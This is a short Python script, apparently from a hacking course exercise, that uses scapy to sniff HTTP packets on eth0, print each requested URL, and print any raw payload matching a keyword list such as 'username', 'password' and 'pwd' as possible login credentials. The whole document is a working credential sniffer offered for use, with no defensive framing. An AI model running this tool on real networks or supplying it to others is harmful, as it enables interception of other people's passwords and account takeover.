#!/usr/bin/env python

import scapy.all as scapy     # handle tasks like scanning and network discovery
from scapy.layers import http # sending / receiving of HTTP packets natively

# main function
def sniff(interface):
    # iface: interface
    # store: store packets
    # prn: callback function
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

# function that returns the URL received by HTTPRequest
def get_url(packet):
    return packet[http.HTTPRequest].Host.decode("utf-8") + packet[http.HTTPRequest].Path.decode("utf-8")

# function that returns the possible login information based on a list of potential keywords
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load.decode("utf-8")
        keywords = ["username", "user", "login", "usrnm", "usr", "uname", "password", "pass", "psswrd", "pwd", "betty"]
        for keyword in keywords:
            if keyword in load:
                return load

# function that processes the sniffed packets
def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")

sniff("eth0")